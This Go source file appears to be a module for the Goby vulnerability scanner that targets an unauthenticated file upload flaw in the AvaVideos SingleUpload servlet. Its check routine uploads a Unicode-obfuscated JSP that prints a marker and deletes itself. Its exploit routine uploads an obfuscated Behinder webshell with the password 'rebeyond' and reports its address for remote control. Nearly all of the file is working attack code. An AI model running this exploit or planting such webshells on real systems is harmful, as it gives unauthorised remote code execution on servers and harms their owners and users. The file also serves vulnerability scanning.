package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "AvaVideos SingleUpload Servlet File Upload",
    "Description": "SingleUpload Servlet File upload,Attackers can upload malicious files without authentication.",
    "Product": "AvaVideos",
    "Homepage": "https://www.ava.com.cn/product_1.html",
    "DisclosureDate": "2021-06-11",
    "Author": "SNCKER",
    "GobyQuery": "body=\"top.location = './ie.html'\" && body=\"app\"",
    "Level": "3",
    "Impact": "",
    "Recommendation": "",
    "References": [
        "https://gobies.org/"
    ],
    "RealReferences": null,
    "HasExp": true,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "File Upload"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "AvaVideos"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10206"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomStr := goutils.RandomHexString(8)
			uri := "/admin/servlet/SingleUpload?FileName=" + randomStr + ".jsp/"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "multipart/form-data; boundary=d733dc327d365fed57da61bc02a74650")
			// 因为需要unicode编码绕过，go暂时找不到相应功能的包所以只能写死了。访问jsp输出e165421110ba03099a1c0393373c5b43，然后自删除。
			// out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));new java.io.File(application.getRealPath(request.getServletPath())).delete();
			jsp_code := "<%\\u006F\\u0075\\u0074\\u002E\\u0070\\u0072\\u0069\\u006E\\u0074\\u006C\\u006E\\u0028\\u006E\\u0065\\u0077\\u0020\\u0053\\u0074\\u0072\\u0069\\u006E\\u0067\\u0028\\u006E\\u0065\\u0077\\u0020\\u0073\\u0075\\u006E\\u002E\\u006D\\u0069\\u0073\\u0063\\u002E\\u0042\\u0041\\u0053\\u0045\\u0036\\u0034\\u0044\\u0065\\u0063\\u006F\\u0064\\u0065\\u0072\\u0028\\u0029\\u002E\\u0064\\u0065\\u0063\\u006F\\u0064\\u0065\\u0042\\u0075\\u0066\\u0066\\u0065\\u0072\\u0028\\u0022\\u005A\\u0054\\u0045\\u0032\\u004E\\u0054\\u0051\\u0079\\u004D\\u0054\\u0045\\u0078\\u004D\\u0047\\u004A\\u0068\\u004D\\u0044\\u004D\\u0077\\u004F\\u0054\\u006C\\u0068\\u004D\\u0057\\u004D\\u0077\\u004D\\u007A\\u006B\\u007A\\u004D\\u007A\\u0063\\u007A\\u0059\\u007A\\u0056\\u0069\\u004E\\u0044\\u004D\\u003D\\u0022\\u0029\\u0029\\u0029\\u003B\\u006E\\u0065\\u0077\\u0020\\u006A\\u0061\\u0076\\u0061\\u002E\\u0069\\u006F\\u002E\\u0046\\u0069\\u006C\\u0065\\u0028\\u0061\\u0070\\u0070\\u006C\\u0069\\u0063\\u0061\\u0074\\u0069\\u006F\\u006E\\u002E\\u0067\\u0065\\u0074\\u0052\\u0065\\u0061\\u006C\\u0050\\u0061\\u0074\\u0068\\u0028\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002E\\u0067\\u0065\\u0074\\u0053\\u0065\\u0072\\u0076\\u006C\\u0065\\u0074\\u0050\\u0061\\u0074\\u0068\\u0028\\u0029\\u0029\\u0029\\u002E\\u0064\\u0065\\u006C\\u0065\\u0074\\u0065\\u0028\\u0029\\u003B%>"
			cfg.Data = "--d733dc327d365fed57da61bc02a74650\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"blob\"\r\nContent-Type: Content-Type: image/png\r\n\r\n" + jsp_code + "\r\n--d733dc327d365fed57da61bc02a74650--\r\n"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "success") {
					uri_1 := "/admin/upload/" + randomStr + ".jsp"
					cfg_1 := httpclient.NewGetRequestConfig(uri_1)
					cfg_1.VerifyTls = false
					cfg_1.FollowRedirect = false
					if resp, err := httpclient.DoHttpRequest(u, cfg_1); err == nil {
						return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "e165421110ba03099a1c0393373c5b43")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			randomStr := goutils.RandomHexString(8)
			uri := "/admin/servlet/SingleUpload?FileName=" + randomStr + ".jsp/"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "multipart/form-data; boundary=d733dc327d365fed57da61bc02a74650")
			//默认冰蝎马
			jsp_code := "<%!\\u0063\\u006c\\u0061\\u0073\\u0073\\u0020\\u0055\\u0020\\u0065\\u0078\\u0074\\u0065\\u006e\\u0064\\u0073\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072\\u007b\\u0055\\u0028\\u0043\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072\\u0020\\u0063\\u0029\\u007b\\u0073\\u0075\\u0070\\u0065\\u0072\\u0028\\u0063\\u0029\\u003b\\u007d\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u0020\\u0067\\u0028\\u0062\\u0079\\u0074\\u0065\\u0020\\u005b\\u005d\\u0062\\u0029\\u007b\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e\\u0020\\u0073\\u0075\\u0070\\u0065\\u0072\\u002e\\u0064\\u0065\\u0066\\u0069\\u006e\\u0065\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0062\\u002c\\u0030\\u002c\\u0062\\u002e\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0029\\u003b\\u007d\\u007d%><%\\u0069\\u0066\\u0020\\u0028\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0029\\u002e\\u0065\\u0071\\u0075\\u0061\\u006c\\u0073\\u0028\\u0022\\u0050\\u004f\\u0053\\u0054\\u0022\\u0029\\u0029\\u007b\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u006b\\u003d\\u0022\\u0065\\u0034\\u0035\\u0065\\u0033\\u0032\\u0039\\u0066\\u0065\\u0062\\u0035\\u0064\\u0039\\u0032\\u0035\\u0062\\u0022\\u003b\\u002f\\u002a\\u0072\\u0065\\u0062\\u0065\\u0079\\u006f\\u006e\\u0064\\u002a\\u002f\\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e\\u002e\\u0070\\u0075\\u0074\\u0056\\u0061\\u006c\\u0075\\u0065\\u0028\\u0022\\u0075\\u0022\\u002c\\u006b\\u0029\\u003b\\u006a\\u0061\\u0076\\u0061\\u0078\\u002e\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f\\u002e\\u0043\\u0069\\u0070\\u0068\\u0065\\u0072\\u0020\\u0063\\u003d\\u006a\\u0061\\u0076\\u0061\\u0078\\u002e\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f\\u002e\\u0043\\u0069\\u0070\\u0068\\u0065\\u0072\\u002e\\u0067\\u0065\\u0074\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065\\u0028\\u0022\\u0041\\u0045\\u0053\\u0022\\u0029\\u003b\\u0063\\u002e\\u0069\\u006e\\u0069\\u0074\\u0028\\u0032\\u002c\\u006e\\u0065\\u0077\\u0020\\u006a\\u0061\\u0076\\u0061\\u0078\\u002e\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f\\u002e\\u0073\\u0070\\u0065\\u0063\\u002e\\u0053\\u0065\\u0063\\u0072\\u0065\\u0074\\u004b\\u0065\\u0079\\u0053\\u0070\\u0065\\u0063\\u0028\\u006b\\u002e\\u0067\\u0065\\u0074\\u0042\\u0079\\u0074\\u0065\\u0073\\u0028\\u0029\\u002c\\u0022\\u0041\\u0045\\u0053\\u0022\\u0029\\u0029\\u003b\\u006e\\u0065\\u0077\\u0020\\u0055\\u0028\\u0074\\u0068\\u0069\\u0073\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072\\u0028\\u0029\\u0029\\u002e\\u0067\\u0028\\u0063\\u002e\\u0064\\u006f\\u0046\\u0069\\u006e\\u0061\\u006c\\u0028\\u006e\\u0065\\u0077\\u0020\\u0073\\u0075\\u006e\\u002e\\u006d\\u0069\\u0073\\u0063\\u002e\\u0042\\u0041\\u0053\\u0045\\u0036\\u0034\\u0044\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072\\u0028\\u0029\\u002e\\u0064\\u0065\\u0063\\u006f\\u0064\\u0065\\u0042\\u0075\\u0066\\u0066\\u0065\\u0072\\u0028\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u0052\\u0065\\u0061\\u0064\\u0065\\u0072\\u0028\\u0029\\u002e\\u0072\\u0065\\u0061\\u0064\\u004c\\u0069\\u006e\\u0065\\u0028\\u0029\\u0029\\u0029\\u0029\\u002e\\u006e\\u0065\\u0077\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065\\u0028\\u0029\\u002e\\u0065\\u0071\\u0075\\u0061\\u006c\\u0073\\u0028\\u0070\\u0061\\u0067\\u0065\\u0043\\u006f\\u006e\\u0074\\u0065\\u0078\\u0074\\u0029\\u003b\\u007d%>"
			cfg.Data = "--d733dc327d365fed57da61bc02a74650\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"blob\"\r\nContent-Type: Content-Type: image/png\r\n\r\n" + jsp_code + "\r\n--d733dc327d365fed57da61bc02a74650--\r\n"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "success") {
					addr := "/admin/upload/" + randomStr + ".jsp"
					expResult.Output = "Webshell Addr: " + expResult.HostInfo.FixedHostInfo + addr + "\nWebshell Pass: rebeyond\nUse Behinder to connect"
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
